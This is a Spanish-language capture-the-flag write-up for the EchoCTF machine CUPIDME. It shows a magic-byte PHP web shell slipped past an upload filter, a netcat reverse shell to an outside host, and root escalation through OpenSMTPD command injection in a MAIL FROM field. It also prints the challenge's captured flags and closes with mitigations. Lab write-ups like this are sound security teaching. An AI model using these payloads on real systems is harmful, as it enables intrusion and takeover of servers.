


![cupidme1](cupidme1.png)

## Introducción

La máquina **CUPIDME** de EchoCTF simula ser un servidor web dedicado al hospedaje de imágenes, pero presenta múltiples fallos de seguridad que permiten obtener acceso no autorizado, ejecutar código malicioso y escalar privilegios. Su descripción menciona que la seguridad de esta máquina es "tan imaginaria como Cupido", lo cual resulta ser cierto.

**IP:** `10.0.30.187`

---

## Reconocimiento y Escaneo

Iniciamos con un escaneo de puertos usando RustScan:

```bash
rustscan -a 10.0.30.187
```

Resultado:

```
80/tcp open http
```

Solo se encuentra abierto el puerto 80, que aloja un sitio web. Al visitar `http://10.0.30.187`, se presenta una página que simula ser un servicio para subir imágenes.

---

## Análisis del Código Fuente

En el código HTML se encuentra un formulario comentado que permite subir imágenes:

```html
<!--<form action="upload.php" method="post" enctype="multipart/form-data">
  Select image to upload:<br/>
  <input type="file" name="image" id="image">
  <input type="submit" value="Upload Image" name="submit">
</form>-->
```

Al descomentar y habilitar este formulario (manualmente o mediante herramientas), aparece la funcionalidad de subida de archivos.

Al intentar subir una imagen cualquiera, el sitio responde:

```
Mimetype not allowed, please upload an image/jpeg file.
```

Luego de eso, al subir una imagen JPEG, el servidor arroja otro error:

```
The maximum file size supported is 39 bytes.
```

### Explicación técnica:

- **Mimetype**: es el tipo de contenido definido por el encabezado HTTP del archivo. En este caso, el servidor solo permite archivos con mimetype `image/jpeg`.
- **Limitación de tamaño**: restringe archivos a 39 bytes, lo cual representa un reto para subir código malicioso.

---

## Bypass de Validaciones y RCE

Para evadir ambos filtros, se crea un archivo PHP que simule ser una imagen JPEG:

```bash
echo -n -e '\xFF\xD8\xFF\xE0' > revershell.php
```

Luego se edita con:

```php
<?=\`$_GET[0]\`?>
```

Este payload permite ejecutar comandos desde la URL usando el parámetro `0`. El archivo se sube exitosamente y queda disponible en:

```
http://10.0.30.187/images/revershell.php
```

Para obtener una reverse shell, se usa:

```bash
nc -lvnp 4444
```

Y se accede a la web:

```
http://10.0.30.187/images/revershell.php?0=nc 10.10.6.42 4444 -c /bin/bash
```

### Mejora de TTY

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

---

## Escalamiento de Privilegios vía SMTP

Se detecta el puerto 25 corriendo **OpenSMTPD** de manera local (`127.0.0.1:25`). Este servicio SMTP está accesible solo desde localhost y puede procesar correos manualmente.

Usamos Netcat para enviar un correo malicioso:

```bash
nc -nv 127.0.0.1 25
```

Secuencia SMTP:

```
HELO xd
MAIL FROM:<;chmod +s /bin/bash;>
RCPT TO:<root>
DATA
.
QUIT
```

Este comando activa un exploit basado en OpenSMTPD (referenciado como CVE-2020-7247 en versiones vulnerables) que permite ejecución remota al inyectar comandos dentro de campos SMTP.

Verificamos los permisos con:

```bash
ls -l /bin/bash
```

Y ejecutamos:

```bash
bash -p
```

para obtener shell como root.

---

## Extracción de Banderas

Se ejecuta el siguiente script para encontrar todas las banderas en el sistema:

```bash
cd / && (
  grep -rlE "ETSCTF_[0-9a-f]{32}" --exclude-dir=proc --exclude-dir=dev 2>/dev/null |
  while read -r f; do
    strings "$f" | grep -oE "ETSCTF_[0-9a-f]{32}" | sed "s|^|$f: |";
  done;
  strings /proc/*/environ 2>/dev/null | grep -oE "ETSCTF_[0-9a-f]{32}" | sed 's|^|/proc/*/environ: |';
  find / -name "ETSCTF_*" 2>/dev/null | grep -oE "ETSCTF_[0-9a-f]{32}" | sed 's|^|/root: |';
) | sort | uniq
```

### Banderas encontradas:

- `/proc/*/environ`: `ETSCTF_d7ccb36dd0c869476d0e31e46a9cc048`
- `/root`: `ETSCTF_fb8320c990b3e315a9983382655bac2e`
- `/etc/passwd`: `ETSCTF_e20a6a5bf097fd763539867c299ece88`
- `/etc/shadow`: `ETSCTF_34d5a93d2d4de072a935ec8c0183c6d8`
- `/usr/local/lib/.sha512sum`: `ETSCTF_fb8320c990b3e315a9983382655bac2e`
- `/var/www/html/challenge.php`: `ETSCTF_98e0d0b4ecc1a1b683487ef900694b34`
- `/var/www/html/index.php`: `ETSCTF_e4235b2b53d6ebf395d742ab95ba8b57`

---

## Identificación de Vulnerabilidades

1. **Fallo en validación de tipo de archivo y tamaño**: permite la carga de archivos arbitrarios con headers de imagen falsos.
2. **Ejecución remota vía PHP**: al permitir interpretación de archivos `.php` subidos.
3. **SMTP vulnerable (OpenSMTPD)**: procesó comandos incrustados en cabeceras de correo, permitiendo ejecutar código como root.
4. **Falta de protección sobre rutas de subida y ejecución web**.

---

## Medidas de Mitigación

- **Validación estricta del tipo de archivo**: usar validación del contenido y no solo del mimetype o extensión.
- **Evitar interpretación de scripts en carpetas de subida**: configurar el servidor para no ejecutar `.php` en carpetas como `/images/`.
- **Actualizar servicios como OpenSMTPD**: mantener todas las herramientas de red actualizadas para prevenir exploits conocidos.
- **Limitar privilegios del usuario `www-data`**: evitar acceso innecesario a servicios internos.
- **Eliminar archivos subidos automáticamente si no son verificados manualmente**.

---

**-Writeup by SheepsStealer-**
